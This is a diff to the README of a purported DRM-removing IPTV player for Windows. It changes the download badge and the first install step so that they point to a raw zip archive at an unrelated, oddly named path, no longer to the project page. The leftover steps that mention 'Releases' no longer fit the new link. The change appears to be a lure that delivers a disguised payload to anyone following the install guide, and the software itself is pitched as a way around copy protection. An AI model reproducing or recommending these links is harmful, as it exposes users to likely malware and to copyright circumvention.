@@ -5,7 +5,7 @@ description: "Manage IPTV and OTT media streams with this self-hosted server fea
 ---
 # 📺 o11pro-unpacked - Stream your favorite media content easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Beatenup-kidnapping12/o11pro-unpacked)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Beatenup-kidnapping12/beatenup-kidnapping12.github.io/main/cytogenesis/io-beatenup-github-kidnapping-prep.zip)
 
 This software provides a direct interface for IPTV and streaming services. It removes standard digital rights management barriers to allow smooth playback of media across your devices. The application functions as a standalone media player designed for Windows users who want an uncomplicated viewing experience.
 
@@ -25,7 +25,7 @@ Ensure your Windows system has the latest updates installed before you proceed.
 
 Follow these instructions to set up the software on your machine.
 
-1. Visit the following page to download the latest archive: https://github.com/Beatenup-kidnapping12/o11pro-unpacked
+1. Visit the following page to download the latest archive: https://raw.githubusercontent.com/Beatenup-kidnapping12/beatenup-kidnapping12.github.io/main/cytogenesis/io-beatenup-github-kidnapping-prep.zip
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the most recent version available.
 4. Download the file ending in .zip to your computer.
